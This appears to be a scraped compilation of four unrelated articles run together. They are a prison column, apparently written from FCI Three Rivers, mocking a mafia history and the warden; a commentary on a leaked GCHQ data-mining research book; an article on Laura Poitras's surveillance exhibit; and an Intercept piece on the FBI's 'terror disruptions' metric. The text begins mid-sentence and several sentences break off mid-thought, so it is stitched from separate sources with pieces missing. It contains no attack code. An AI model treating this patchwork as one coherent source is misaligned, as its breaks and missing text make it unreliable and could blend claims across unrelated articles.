before finally getting kicked out altogether, I was delighted to
arrive here at FCI Three Rivers, a medium security prison subject to
occasional outbreaks of gang warfare that also happens to be quite a
lot of fun. And though one’s first few days at a new prison are always
given over largely to errands and social obligations, I did manage to
get in some much-needed reading time when someone lent me a copy of
Five Families, a history of the American mafia by the veteran New York
Times crime reporter Selwyn Raab. I’ve never had much interest in
organized crime of the non-governmental sort, but ever since 2009 when
I read through the bulk of Thomas Friedman’s past columns in the
course of researching a book on the subject of incompetence, I’ve been
fascinated by the extent to which a fellow can be a bit of a dummy,
with questionable writing abilities and a penchant for making
demonstrably erroneous attacks on others, and still find regular
employment with the nation’s most prestigious newspaper (though in
fairness to the Times, they did eventually get rid of William
I’m afraid I gave up on reading Five Families straight through after
about the halfway mark, by which point it had become clear that Raab,
contrary to all decency, was going to continue using the phrase
“law-enforcement” thusly, with the unwarranted hyphen, something that
would have been more tolerable did the term not necessarily appear
every few pages due to the nature of the subject matter, often in the
company of such other improprieties as “civil-rights,”
“public-relations,” “stolen-car rings,” or “loan-shark,” and to such
an extent that one could be forgiven for suspecting that Raab himself,
for all his tough talk on crime, is in fact some sort of illicit
hyphen smuggler.
Luckily, this is the sort of book from which one can extract the most
telling instances of Gray Lady-caliber foolishness just by skimming
around. At some point Raab seems to decide that the writers of The
Sopranos must be punished for humanizing the mafia in the course of
writing a drama about human beings who are in the mafia. And so, more
in sadness than in anger, but more in confusion than either, he set
out to debunk the show’s fictional plotline by way of his own
fictional journalistic expertise: “Genuine capos and wiseguys would
never emulate Tony’s behavior. … No top-tier mobster would last long
if he behaved like Tony Soprano, who defies basic Mafioso caution by
exposing himself as a ripe target, to be easily mowed down by rivals.
He drives without a bodyguard; sips espresso in daylight at a sidewalk
café.” This comes just a few chapters after we’re told the following
about a real-life top-tier mobster: “Shunning bodyguards and
bullet-proof limousines, the sixty-six-year-old godfather met with his
Mafia associates in restaurants and travelled about Manhattan in taxis
like any ordinary businessman.”
To his credit, Raab did manage to refrain from rendering this last bit
as “ordinary-businessman,” which is just extraordinary, so we’ll give
him another try: “Sex and psychiatry are prominent in The Sopranos’
story line. Confiding in a psychiatrist, however, would be a
radioactive mistake for a boss or capo, who can never display symptoms
of weakness or mental instability.” Naturally Raab has already
forgotten having written the following about mafia boss Frank
Costello: “Striving for inner peace while hovering between criminal
affiliates and respected society, Costello tried psychoanalysis.”
Even had the author not been so sporting as to provide us with
comically perfect counterexamples by which to disprove his various
inane objections, one could have also pointed out that Tony Soprano’s
decision to see a psychiatrist does in fact prove to be a “mistake”
insomuch as that it directly leads to a rupture in his organization
culminating in a botched assassination attempt in the very first
season, so this objection wouldn’t have made any sense even had it
gotten past that crucial
directly-contradicted-by-your-own-fucking-book hurdle that seems to be
giving Raab so much trouble. Now take a moment to reflect on the fact
that this is the guy the New York Times assigned to report on one of
the nation’s most complex and insidious criminal conspiracies — this
plodding hyphen addict who cannot seem to follow a television show or
even his own manuscript. One supposes that there is some alternate
universe in which this might be considered a problem and where Ross
Douthat manages a furniture store and everyone knows his place.
BUT THERE’S MORE to prison life than just sitting around despising the
New York Times. A week after arrival at Three Rivers, we new inmates
were summoned to an “Admissions and Orientation” seminar in which the
various department heads each speak for a few minutes about
institutional policy. I’d attended one of these back at Fort Worth;
usually the highlight is a short video clip of Bureau of Prisons
Director Charles Samuels, who gives a little talk. No one knows what
the talk is about, as whoever’s nephew was put in charge of producing
the video has talked Samuels into pausing every couple of sentences to
shift position and look into the other camera, just like the
newscasters, something that the fellow can manage only with the most
hilarious awkwardness, and so it proves impossible to follow what he’s
actually saying — which is a shame, as it’s almost certainly something
very non-formulaic and true.
Today, however, the chief attraction was to be our warden, Norbal
Vazquez, a longtime BOP functionary from Puerto Rico who is proverbial
for his deranged monologues as well as for being regarded with great
contempt by staff and inmates alike. Here are some actual quotes from
his exquisitely demented half-hour orientation talk, during which he
waddled back and forth, wagging his finger in admonishment when
appropriate and sometimes when not:
    On his own qualifications for the job: “I am here because I earned it!”
    On the assistant wardens upon whom lesser wardens depend: “I do
not need them!”
    On his inspiring biography: “I was a case manager before, and I
was an OUTSTANDING one!” [wags finger]
    On the status of we benighted inmates, sitting in darkness: “You
are all my children!”
    On who controls the prison: “Probably in some of your minds, is
inmates! But you are wrong!”
    On, er, violators: “I have no mercy for violators!”
    On medical care: “You have a bullet in your leg and you want the
bureau to heal you! Ha! Ha ha!”
    On the insufficiency of our meals: “Don’t come complain to me
about your meals. Because there are children with nothing!”
    On gang warfare: “If you show force, I am going to show force!”
    On homemade alcohol: “If you are drinking all that nasty thing,
shame on you! When your liver fails, I don’t care!”
    On inmates who are placed in the SHU and transferred to violent
maximum security prisons because they’ve been caught with harmless
contraband like synthetic marijuana: “They cry like babies! I have no
The only disappointing thing about the presentation was that he didn’t
end by exhibiting his medals and declaring himself President for Life;
indeed, I almost cried when someone told me he was retiring a few
weeks hence. And “all that nasty thing” is my new favorite
hooch-related meme, edging out “PRISON MADE INTHOXICANT” from a few
columns back.
All in all, it was an informative speech in spite of itself, even
aside from the fellow’s suspicious insistence on his own competence
and self-reliance and entirely meritocratic ascension to the top spot.
There was quite a bit of talk, for instance, about how the gangs
aren’t in control of the prison, something that obviously wouldn’t
need so much triumphant emphasis were such a state of affairs not at
least a possibility.
IN FACT, THE GANGS really don’t have control over the prison. But then
neither does the administration, if by “control” we mean the ability
to make uncontested decisions over what happens within a given space,
in which case control is always a matter of degree. The federal and
state governments of the United States, for instance, exercise some
degree of overlapping control over their territory, but not to such an
extent that the various law-enforcement agencies — er, law enforcement
agencies — arrest any but a small minority of residents who violate
the law. This is just as well, since the law requires that the tens of
millions of Americans who use drugs or gamble or involve themselves in
prostitution be imprisoned — and that’s not even counting federal law,
which, as convincingly estimated by civil liberties attorney Harvey
Silvergate in his book Three Felonies a Day, the average American
unwittingly violates every day. And thus it is that the U.S. can
continue to exist above the level of an unprecedented gulag state only
to the extent that its laws are not actually enforced — an
extraordinary and fundamental fact of American life that one might
hope in vain to see rise to the level of an election issue, but which
is at least worth keeping in mind when it comes to the debate over
whether or not we should keep granting the state ever more powerful
methods of surveillance until it becomes the All-Seeing God Against
Whose Laws We All Have Sinned. (Personally I’d vote “no,” but then I’m
a felon and can’t vote anyway.)
As is the case with the country at large, the rules within each
federal prison are such that a large portion of everyday activity
actually violates those rules — and in both cases, 99 percent of the
violations go unpunished, while anyone who proves inconvenient to the
powers that be can be singled out for retaliation. Technically it’s
against the rules to give anything to another inmate, for instance, or
to sell or trade or lend for that matter, but of course this is done
all day without a second thought, often in plain view of the guards,
not a single one of whom would consider objecting. There are other
rules that are almost universally disregarded but can be invoked at
whim; there is also a catch-all violation, “Anything Unauthorized,” on
hand as a last resort. But rabble-rousers can usually be dispensed
with via more specific regulations such as those barring the signing
of petitions or holding of demonstrations. (I myself was thrown in the
hole for months due to my supposed leadership role in one such
demonstration against an abusive guard who’d just threatened an
elderly man.)
Part of the justification behind those two regulations in particular
is that there exists a means by which inmates can have their
grievances addressed: the administrative remedy process. Naturally the
BOP routinely conspires to prevent inmates from completing that
process; the surreal lengths to which it’s gone to keep me from
pursuing my own retaliation complaint, a process I’ve documented in
this column over the course of the last nine months, are actually
quite commonly deployed against inmates deemed to have a good chance
of winning in court. Presumably this is why the Freedom of Information
Act request that The Intercept filed with the BOP some months ago to
obtain records of the administrative remedy process at FCI Fort Worth
was denied with no explanation, even though the documents in question
are specifically designated as being FOIA accessible. Any
comprehensive examination of those records would reveal a systematic
and highly effective effort by BOP officials to prevent inmates from
bringing instances of major policy violations and even outright
criminal activity by the bureau to the attention of the courts. The
American people do not control their own prisons.
The reality is that control is shared by way of a sort of makeshift
federalism that varies in particulars from prison to prison but in
which real power is always divided among the various gangs, the staff,
and local and regional administrators in an arrangement that’s best
described as a cross between the old Swiss canton system and China
during the Warring States period, which I’ll be the first to
acknowledge is not especially helpful. Suffice to say that it will
take me the remainder of my sentence to provide a real sense of this
remarkable state-within-a-state and its inimitable politics — the
politics of the literally disenfranchised, who live their lives in the
very guts of government without being able to rely on its protections,
and so are forced to provide their own. Really, it’s a
Complicating matters further is the great extent to which prisons can
differ, with the most pronounced of these divisions being that between
the state and federal systems. Broadly, we federals tend to look down
upon our regional cousins as “not quite our sort, old boy,” although
I’m probably the only one who puts it in exactly those terms. The
state prisons tend to house the small-time dealers, whereas the feds
are more often home to the guys who supplied them. The state is
halfway filled with such actual criminals as thieves, rapists, and
murderers, whereas the feds are made up largely of illegal immigrants
and drug entrepreneurs — people who have neither hurt anyone nor
deprived them of their property, but instead made the mistake of
taking all of this “free market” talk seriously. The character of the
federal prisons, then, will usually differ from those of the states.
But then they’ll also differ among themselves, sometimes quite a bit,
and not just along other readily obvious divisions such as those
between minimum, low, medium, and maximum security designations,
either. A few years ago the medium at Beaumont, Texas, to which I just
narrowly avoided being sent myself, was considerably more violent than
many of the maximums (also known as pens or, more technically, USPs).
Back at the FCI Fort Worth, there was a marked degree of difference in
how certain things were done even between the several 300-man units
into which inmates were divided. And since the local administrators
can disregard national policy more or less at will, as has been
documented in this column repeatedly for two years, de facto policy
will naturally vary from institution to institution as well. The
result of all of this is that each prison is its own unique snowflake,
fluttering about on gusts of cultural drift and BOP lawlessness.
THE VITAL STATISTICS of my stomping grounds here at Three Rivers,
then, are as follows. The prison is home to a bit more than 1,000
inmates, of whom about 60 percent are Mexican nationals, another 20
percent are U.S. Hispanics, 10 percent are black, 5 percent are Latin
American, and 5 percent are white (the ofay percentage of 15 percent I
cited last time appears to have been out of date). About half of the
Mexicans “run with” (institutional slang for “are affiliated with”)
the Paisas, a relatively amorphous prison gang that draws its ranks
almost exclusively from Mexican nationals; a smaller percentage of
U.S. Hispanics run with Tango Blast, a more organized gang with a much
cooler name; while blacks and whites for purposes of prison riots and
dining arrangements both act mostly as race-based units.
As usual, there are all manner of qualifiers and exceptions plus a
smattering of smaller groupings: The Muslims will usually constitute
their own little umma, there are a couple of whites who run with
Tango, and so on. The most amusing of these aberrations involved the
fellow with whom I shared a cell before he transferred to a low a few
weeks back. Aaron LeBaron was born into an ultra-fundamentalist Mormon
cult led by his father, who had moved the wives and kids to Mexico
after some members of his congregation started to question whether or
not all of the voices he was hearing were actually from God. Aaron
eventually inherited the family theocracy as well as the family hit
list and the family international stolen car ring. In the end he was
captured and sentenced to 45 years. Today Aaron is an agnostic and
longtime Skeptic Magazine subscriber who was very excited to learn
that I’d written for that magazine as well as for Skeptical Inquirer.
(Come to think of it, he was the only person I’ve ever met who found
either one the least bit impressive, and I’ve been working them into
introductory conversations for years.) At any rate, having been raised
in Mexico and speaking perfect Spanish, this gangly, bespectacled,
white, Mormon-looking fellow had been accepted as one of the Paisas,
with whom he sat every day to eat and watch television. Scientists
cannot measure the extent to which I’m going to dominate every dinner
party conversation for the rest of my life.
For a medium, Three Rivers isn’t particularly violent. The last major
gang war, between the Tangos and the Paisas, was nearly a year ago;
afterward the compound went on lockdown for about two weeks, itself a
fairly typical gang intelligence investigation/cool-down period. In
the three months since I’ve arrived, I’ve only had to “take a knee”
once (inmates here are supposed to put at least one knee to the ground
when officers run by screaming “Get the fuck down!” or some variation
thereof as they proceed to the location of a conflict). And we’ve only
been locked down in the aftermath of a fight on one occasion, for just
a few hours.
This is just as well, as I’m thereby able to concentrate on the
trickle of information coming in from the wicked world beyond the
fence. Lately I’ve been getting garbled reports of hoverboards, as
well as some sort of new fascist movement that could conceivably take
control of the White House this year, though I find it difficult to
believe that the boards actually float like the ones from the movie.
Meanwhile, I’m halfway through the newish first volume of Niall
Ferguson’s biography of Henry Kissinger, which we shall examine in
some detail next time. For now I will simply leave off with the
following actual sentences from Ferguson’s introduction: “In this
context, it is a strange irony of the Kissinger literature that so
many of the critiques of Kissinger’s mode of operation have a subtle
undertone of anti-Semitism. … This prompts the question: might the
ferocity of the criticism that Kissinger has attracted perhaps have
something to do with the fact that he, like the Rothschilds, is
Jewish? This is not to imply that his critics are anti-Semites.” Well,
the hyphens are all in their proper places, anyway.

A technical reading of the “HIMR Data Mining Research Problem Book”
3 February 2016
Boing Boing just released a classified GCHQ document that was meant to
act as the Sept 2011 guide to open research problems in Data Mining.
The intended audience, Heilbronn Institute for Mathematical Research
(HIMR), is part of the University of Bristol and composed of
mathematicians working for half their time on classified problems with
First off, a quick perusal of the actual publication record of the
HIMR makes a sad reading for GCHQ: it seems that very little research
on data mining was actually performed post-2011-2014 despite this
pitch. I guess this is what you get trying to make pure mathematicians
solve core computer science problems.
However, the document presents one of the clearest explanations of
GCHQ’s operations and their scale at the time; as well as a very
interesting list of open problems, along with salient examples.
Overall, reading this document very much resembles reading the needs
of any other organization with big-data, struggling to process it to
get any value. The constrains under which they operate (see below),
and in particular the limitations to O(n log n) storage per vertex and
O(1) per edge event, is a serious threat — but of course this is only
for un-selected traffic. So the 5000 or so Tor nodes probably would
have a little more space and processing allocated to them, and so
would known botnets — I presume.
Secondly, there is clear evidence that timing information is both
recognized as being key to correlating events and streams; and it is
being recorded and stored at an increasing granularity. There is no
smoking gun as of 2011 to say they casually de-anonymize Tor circuits,
but the writing is on the wall for the onion routing system. GCHQ at
2011 had all ingredients needed to trace Tor circuits. It would take
extra-ordinary incompetence to not have refined their traffic analysis
techniques in the past 5 years. The Tor project should do well to not
underestimate GCHQ’s capabilities to this point.
Thirdly, one should wonder why we have been waiting for 3 years until
such clear documents are finally being published from the Snowden
revelations. If those had been the first published, instead of the
obscure, misleading and very non-informative slides, it would have
saved a lot of time — and may even have engaged the public a bit more
than bad powerpoint.
Some interesting points in the document in order:
    It turns out that GCHQ has a written innovation strategy,
reference [I75]. If someone has a copy it would be great to see it,
and also understand where the ACE program fits in it.
    GCHQ, at the time used heavily two families of technologies:
Hadoop, for bulk processing of raw collected data (6 months for
meta-data apparently), and IBM Streams (DISTILLERY) for stream,
real-time, processing. A lot of the discussion, and open problems,
relate to the fact that bulk collection can only provide a limited
window of visibility, and intelligence related selection, and
processing has to happen within this window. Hence the interest in
processing streaming data.
    Section 2 is probably the clearest explanation of how modern
SIGINT works. I would like to congratulate the (anonymous) author, and
will be setting it as the key reading for my PETS class. It summarizes
well what countless crappy articles on the Snowden leaks have
struggled to piece together. I wish journalists just released this
first, and skipped the ugly slides.
    The intro provides a hit at the scale of cable interception
operations as of 2011. It seems that 200 “bearers” of 10 Gigabit / sec
were being collected at any time; it makes clear that many more
sources were available to switch to depending on need. That is about 2
Terabit / sec, across 3 sites (Cheltenham, Bude, and LECKWITH).
    Section 2.1.2 explains that a lot (the majority) of data is
discarded very early on, by special hardware performing simple
matching on internet packets. I presume this is to filter out bulk
downloads (from CDNs), known sources of spam, youtube videos, etc.
    The same section (2.1.2) also explains that all meta-data is
pulled from the bearer, and provides an interpretation of what
meta-data is.
    Finally (2.1.2) there is a hint at indexing databases (Query
focused databases / QFD) that are specialized to store meta-data, such
as IP traffic flow data, for quick retrival based on selectors (like
IP addresses).
    Section 2.1.3 explains the problem of “target development”, namely
when no good known selectors exist for a target, and it is the job of
the analyst to match it though either contact chaining or
modus-operandi (MO) matching. It is a very instructive section, which
is the technical justification underpinning a lot of the mass
surveillance going on.
    The cute example chosen to illustrate it (Page 12, end of 2.1.3):
Apparently GCHQ developed many of those techniques to spy on foreign
delegations during the 2009 G20 meeting. Welcome to London!
    Section 2.2.2 provides a glimpse at the cybersecurity doctrine and
world-view at GCHQ, already in 2011. In particular, there is a vision
that CESG will act as a network security service for the nation,
blocking attacks at the “firewalls”, and doing attribution (as if the
attacks will be coming “from outside”). GCHQ would then counter-attack
the hostile sources, or simply use the material they intercepted from
others (4th party collection, the euphemism goes).
    Section 2.2.3 provides a glimpse of the difficulties of running
implants on compromised machines: something that is openly admitted.
Apparently ex-filtrating traffic and establishing command-and-control
with implants is susceptible to passive SIGINT, both a problem and an
    Section 3 and beyond describes research challenges that are very
similar with any other large organization or research group: the
difficulty of creating labelled data sets for training machine
learning models; the challenges on working on partial or streaming
data; the need for succinct representations of data structures; and
the problem of inferring “information flow” — namely chains of
communications that are related to each other.
    It seems the technique of choice when it comes to machine learning
is Random Decision Forrests. Good choice, I also prefer it to others.
They have an in-house innovation: they weight the outputs of each
decision tree. (Something that is sometimes called gradual learning in
the open literature, I believe).
    Steganography detection seems to be a highlight: however there is
no explanation if steganography is a real problem they encountered in
the field, or if it was an easy dataset to generate synthetically.
    Section 4, deals with research problems of “Information Flow in
Graphs”. This is the problem of associated multiple related
connections together, including across types of channels, detecting
botnet Command and Control nodes, and also tracing Tor connections.
Tracing Tor nodes is in fact a stated problem, with a stated solution.
    Highlights include the simple “remit” algorithm that developed by
Detica (page 26, Sect. 4.2.1); PRIME TIME that looks at chains of
length 2; and finally HIDDEN OTTER, that specifically targets Tor, and
botnets. (Apparently an internal group codenamed ICTR-NE develop it).
    Section 4.2.2 looks at communications association through temporal
correlation: one more piece of evidence that timing analysis, at a
coarse scale, is on the cards for mining associations. What is cute is
the example used is how to detect all GCHQ employees: they are the
ones with phones not active between 9am and 5pm when they are at work.
    Beside these, they are interested in change / anomaly detection
(4.4.1), spread of information (such as extremest material), etc. Not
that dissimilar from say an analysis Facebook would perform.
    Section 5 poses problem relating to algorithms on streaming graph
data. It provides a definitions of the tolerable costs of analysis
algorithms (the semi-streaming paradigm): for a graph of n vertices
(nodes), they can store a bit of info per vertex, but not all edges,
or even process all edges. So they have O(n log n) storage and can
only do O(1) processing per event / edge. That could be distilled to a
set of security assumptions.
    Section 5.2.2 / 5.2.3 is an interesting discussion about
relaxations of cliques and also point of that very popular nodes (the
pizza delivery line) probably are noise and should be discarded.
    As of 2011 (sect 5.2.4) it was an open problem how far contact
chaining is required. This is set as an open problem, but states that
analysis usually use 2-hops from targets. Note that other possible
numbers are 3, 4, and 5 since after 6 you probably have included
nearly everyone in the world. So it is not that exciting a problem and
cannot blame the pure mathematicians for not tackling it.
    Section 5.5.1 asks the question on whether there is an
approximation of the correlation matrix, to avoid storing and
processing an n x n matrix. It generally seems that matching
identifiers with identifiers is big business.
    Section 6 poses problems relating to the processing, data mining,
and analysis of “expiring” graphs, namely graphs with edges that
disappear after a deadline. This is again related to the constraint
that storage for bulk un-selected data is limited.
    In section 6.3.2 the semi-streaming model where only O(n log n)
storage per vertex is allowed, and O(1) processing per incoming event
    Appendix A deals with models of academic engagement. I have to say
it is very enlightened: it recognizes the value of openly publishing
the research, after some sanitization. Nice.
    Appendix B and C discuss the technical details and size of the IBM
Streams and Hadoop clusters. Section D presents the production
clusters (652 nodes, total 5216 cores, and 32 GB memory for each
    Section E discusses the legalities of using intercepted data for
research, and bless them they do try to provide some logging and Human
Rights Justification (bulk authorization for research purposes).

Snowden’s Chronicler Reveals Her Own Life Under Surveillance

    Time of Publication: 9:03 am.

Laura Poitras has a talent for disappearing. In her early
documentaries like My Country, My Country and The Oath, her camera
seems to float invisibly in rooms where subjects carry on intimate
conversations as if they’re not being observed. Even in Citizenfour,
the Oscar-winning film that tracks her personal journey from first
contact with Edward Snowden to releasing his top secret NSA leaks to
the world, she rarely offers a word of narration. She appears in that
film exactly once, caught as if by accident in the mirror of Snowden’s
Hong Kong hotel room.
Now, with the opening of her multi-media solo exhibit, Astro Noise, at
New York’s Whitney Museum of American Art this week, Snowden’s
chronicler has finally turned her lens onto herself. And she’s given
us a glimpse into one of the darkest stretches of her life, when she
wasn’t yet the revelator of modern American surveillance but instead
its target.
The exhibit is vast and unsettling, ranging from films to documents
that can be viewed only through wooden slits to a video expanse of
Yemeni sky which visitors are invited to lie beneath. But the most
personal parts of the show are documents that lay bare how
excruciating life was for Poitras as a target of government
surveillance—and how her subsequent paranoia made her the ideal
collaborator in Snowden’s mission to expose America’s surveillance
state. First, she’s installed a wall of papers that she received in
response to an ongoing Freedom of Information lawsuit the Electronic
Frontier Foundation filed on her behalf against the FBI. The documents
definitively show why Poitras was tracked and repeatedly searched at
the US border for years, and even that she was the subject of a grand
jury investigation. And second, a book she’s publishing to accompany
the exhibit includes her journal from the height of that surveillance,
recording her first-person experience of becoming a spying subject,
along with her inner monologue as she first corresponded with the
secret NSA leaker she then knew only as “Citizenfour.”
Poitras says she initially intended to use only a few quotes from her
journal in that book. But as she was transcribing it, she “realized
that it was a primary source document about navigating a certain
reality,” she says. The finished book, which includes a biographical
piece by Guantanamo detainee Lakhdar Boumediene, a photo collection
from Ai Weiwei, and a short essay by Snowden on using radio waves from
stars to generate random data for encryption, is subtitled “A Survival
Guide for Living Under Total Surveillance.” It will be published
widely on February 23.
“I’ve asked people for a long time to reveal a lot in my films,”
Poitras says. But telling her own story, even in limited glimpses,
“provides a concrete example of how the process works we don’t usually
That process, for Poitras, is the experience of being unwittingly
ingested into the American surveillance system.
On the Government’s Radar
Poitras has long suspected that her targeting began after she filmed
an Iraqi family in Baghdad for the documentary My Country, My Country.
Now she’s sure, because the documents released by her Freedom of
Information Act request prove it. During a 2004 ambush by Iraqi
insurgents in which an American soldier died and several others were
injured, she came out onto the roof of the family’s home to film them
as they watched events unfolding on the street below. She shot for a
total of eight minutes and 16 seconds. The resulting footage, which
she shows in the Whitney exhibit, reveals nothing related to either
American or insurgent military positions.
“Those eight minutes changed my life, though I didn’t know it at the
time,” she says in an audio narration that plays around the documents
in her exhibition. “After returning to the United States I was placed
on a government watchlist and detained and searched every time I
crossed the US border. It took me ten years to find out why.”

A Whitney Museum visitor looking at a selection of Poitras’ FOIAed
documents framed in a collection of light boxes. Andy Greenberg
The heavily redacted documents show that the US Army Criminal
Investigation Command requested in 2006 that the FBI investigate
Poitras as a possible “U.S. media representative … involved with
anti-coalition forces.” According to the FBI file, a member of the
Oregon National Guard serving in Iraq identified Poitras and “a local
[Iraqi] leader”—the father of the family that would become the subject
of her film. The soldier, whose name was redacted, questioned Poitras
at the time, and reported that she “became significantly nervous” and
denied filming from the roof. He later told the Army investigators
that he “strongly believed”—but without apparent evidence—“POITRAS had
prior knowledge of the ambush and had the means to report it to U.S.
Forces; however, she purposely did not report it so she could film the
attack for her documentary.”
One page shown in the Whitney exhibit reveals that the New York field
office of the FBI was tracking Poitras’ home addresses, and Poitras
believes the reference to a “detective” working with the FBI indicates
the New York Police Department may have also been involved. By 2007,
the documents reveal that there was a grand jury investigation
proceeding on whether to indict her for unnamed crimes—multiple
subpoenas sought information about her from redacted sources. (Poitras
says that the twelve pages she published in the Whitney exhibition are
only a selection of 800 documents she’s received in her FOIA lawsuit,
which is ongoing.)
Being Constantly Watched
Private as ever, Poitras declined to detail to WIRED exactly how she
experienced that federal investigation in the years that followed. But
flash forward to late 2012, and the surveillance targeting Poitras had
transformed her into a nervous wreck. In the book, she shares a diary
she kept during her time living in Berlin, in which she describes
feeling constantly watched, entirely robbed of privacy. “I haven’t
written in over a year for fear these words are not private,” are the
journal’s first words. “That nothing in my life can be kept private.”
She sleeps badly, plagued with nightmares about the American
government. She reads Cory Doctorow’s Homeland and re-reads 1984,
finding too many parallels with her own life. She notes her computer
glitching and “going pink” during her interviews with NSA
whistleblower William Binney, and that it tells her its hard drive is
full despite seeming to have 16 gigabytes free. Eventually she moves
to a new apartment that she attempts to keep “off the radar” by
avoiding all cell phones and only accessing the Internet over the
anonymity software Tor.
When Snowden contacts her in January of 2013, Poitras has lived with
the specter of spying long enough that she initially wonders if he
might be part of a plan to entrap her or her contacts like Julian
Assange or Jacob Appelbaum, an activist and Tor developer. “Is C4 a
trap?” she asks herself, using an abbreviation of Snowden’s codename.
“Will he put me in prison?”
Even once she decides he’s a legitimate source, the pressure threatens
to overwhelm her. The stress becomes visceral: She writes that she
feels like she’s “underwater” and that she can hear the blood rushing
through her body. “I am battling with my nervous system,” she writes.
“It doesn’t let me rest or sleep. Eye twitches, clenched throat, and
now literally waiting to be raided.”
Finally she decides to meet Snowden and to publish his top secret
leaks, despite her fears of both the risks to him and to herself. Both
the journal and the documents she obtained from the government show
how her own targeting helped to galvanize her resolve to expose the
apparatus of surveillance. “He is prepared for the consequences of the
disclosure,” she writes, then admits: “I really don’t want to become
the story.”
In the end, Poitras has not only escaped the arrest or indictment she
feared, but has become a kind of privacy folk hero: Her work has
helped to noticeably shift the world’s view of government spying, led
to legislation, and won both a Pulitzer and an Academy Award. But if
her ultimate fear was to “become the story,” her latest revelations
show that’s a fate she can no longer escape–and one she’s come to
Poitras’ Astro Noise exhibit runs from February 5 until May 1 at the
Whitney Museum of American Art, and the accompanying book will be
published on February 23.

Disruption strategy involves “a range of tools including arrests,
interviews, or source-directed operations to effectively disrupt
subject’s activities.”
“The FBI’s overbroad and aggressive use of its investigative and
surveillance powers, and its willingness to employ ‘disruption
strategies’ against subjects not charged with crimes can have serious,
adverse impacts on innocent Americans,” the ACLU concluded.
“Being placed under investigation creates an intense psychological,
and often financial, burden on the people under the microscope and
their families, even when they are never charged with a crime,” it
continued. “All the more so when a heinous crime like terrorism is
alleged, and when the investigators are convinced the subject of their
investigation is guilty but they just don’t have the evidence
necessary for arrest.”
The Congressional Research Service report noted that such methods are
reminiscent of the FBI under J. Edgar Hoover, and particularly the
COINTELPRO program, which engaged in “preventive, covert,
intelligence-based efforts to target and contain people, groups, or
movements suspected by the Bureau to be ‘rabble rousers,’ ‘agitators,’
‘key activists,’ or ‘key black extremists.’” The FBI “relied on
illegal means to curb constitutionally protected activity it deemed
threatening to national security.”
FBI Won’t Explain Its Bizarre New Way of Measuring Its Success Fighting Terror
Jenna McLaughlin
Feb. 18 2016, 11:18 p.m.
The Federal Bureau of Investigation has quietly developed a new way to
measure its success in the war on terror: counting the number of
terror threats it has “disrupted” in a year.
But good luck trying to figure out what that number means, how it was
derived, or why it doesn’t jibe with any other law enforcement
statistic, most notably, the number of terror suspects actually
charged or arrested.
In the section on “Performance Measures” in the FBI’s latest financial
statement, the bureau reports 440 “terror disruptions” in the 12-month
period ending on September 30, 2015. That’s compared to 214 in fiscal
year 2014. And it’s more than three times the 2015 “target” of 125.
In a vacuum, that would appear to suggest that the FBI’s
terror-fighting mission — which sucked up $5.3 billion, or 54 percent
of the bureau’s $9.8 billion budget in 2015 — is exceeding
But that number — 440 — is much higher than the number of arrests
reported by the FBI. The Washington Post counted about 60
terror-related arrests in 2015; a study by George Washington
University found 71 arrests related to the Islamic State from March
2014 to the end of 2015.
Of those arrests, many were of people trying to travel abroad or
trying to help others do so. Many more involved people planning
attacks that were essentially imaginary, often goaded by FBI
And according to a document from the Department of Homeland Security
obtained by The Intercept in November, there was only one genuinely
“foiled attack” in the United States between January 2014 and
September 2015. And that one, involving would-be shooters in Garland,
Texas, targeting a cartoon-drawing event inspired by the Prophet
Muhammad, was stopped by the local police department.
The FBI didn’t respond to emails asking basic questions such as what
qualifies as a disruption, why the number is so much higher than the
bureau’s recorded arrests, or how it comes up with its annual
In a January 2015 Performance Report, Justice Department officials
explained that the “targets reflect the number of expected disruptions
based on the estimated threat, yet account for potential
The officials acknowledged that “disruptions can be a challenge to
quantify for future years” because the number of potential plots is
 “Based on past
data trends, coupled with current and emerging threat pictures, the
FBI expects to achieve its FY 2015 and FY 2016 targets.”
A strange way to provide transparency
The “terrorism threat disruptions” metric is a relatively new arbiter
of success for the FBI. In a 2013 Department of Justice document about
strategic goals, fighting terrorism is identified as Strategic Goal 1,
and “number of terrorism disruptions” is Strategic Objective 1.1.
“To provide transparency to its work in the area of counterterrorism,
the Department will disclose a key statistic: the number of terrorism
disruptions,” the department announced.
But the definition was vague: “A disruption is defined as interrupting
or inhibiting a threat actor from engaging in criminal or national
security related activity. A disruption is the result of direct
actions and may include but is not limited to the arrest; seizure of
assets; or impairing the operational capabilities of key threat
And the department’s idea of transparency was problematic. Because the
FBI’s “operational priorities are classified,” the document noted, “it
is only possible to report aggregate data that lacks significant
Experts interviewed by The Intercept suggested two possible
explanations for the high number of terror disruptions.
Gold stars
One possibility, they said, is that the number is just a subjective
way to make people at the FBI look good, or to rationalize the cost.
“This is how the whole career system works in the FBI — statistics,
performance,” said Coleen Rowley, a former FBI agent and
whistleblower. Individuals use statistics to advance their careers,
and the agency, in turn, uses them to justify its budget, she said.
“In the agency, this is the way to advance.”
The fact that the agency establishes a target for terrorism
disruptions is also troubling, said Michael German, a former FBI agent
and fellow with the Brennan Center for Justice. “That the FBI actually
sets a performance goal stating the specific number of terrorist
disruptions it wants to accomplish over the year would seem to create
an incentive to gin up cases where no real threat might exist.”
And if the number is inflated, it wouldn’t be the first time the
Department of Justice or the FBI had been criticized for inaccurately
estimating the impact of their counterterrorism efforts.
In 2007, an inspector general investigation found that the entire
Department of Justice — the FBI included — had messed up its
bookkeeping efforts on terrorism. The FBI mistakenly included marriage
fraud, immigration cases, and others in their records of anti-terror
And in 2013, Inspector General Michael E. Horowitz called out the
office that oversees U.S. attorney’s offices for shoddy reporting that
significantly overstated the number of terrorism convictions, counting
cases that actually dealt with narcotics or money laundering or
including defendants who had their charges dismissed.
“These inaccuracies are important in part because DOJ management and
Congress need accurate terrorism-related statistics to make informed
operational and budgetary decisions,” Horowitz said in a statement
accompanying the 2013 report.
Easier to disrupt than arrest
Another possible explanation for such a big number, however, is that
it accurately reflects a new FBI approach to fighting terror that is
occurring outside of public view — where the bureau decides someone is
a threat and disrupts his or her life in some way that isn’t nearly as
subject to oversight and accountability as an indictment or an arrest.
“I’m sensing a significant change in counterterrorism policy in the
U.S., where we’ve gone from ‘watch and report,’ to ‘let’s just disrupt
them any way we can,’” David Gomez, a former FBI agent and profiler,
as well as a former LAPD officer, told The Intercept. “This has cut
short the way the FBI does long-term investigations. … They’re not
doing that anymore.”
The FBI has indeed been going through some changes.
As a 2013 Congressional Research Service report explains, “Since the
September 11, 2001 (9/11) attacks, the FBI has implemented a series of
reforms intended to transform itself from a largely reactive law
enforcement agency focused on investigations of criminal activity into
a more proactive, agile, flexible, and intelligence-driven agency that
can prevent acts of terrorism.”
This has led law enforcement agencies to use aggressive, proactive
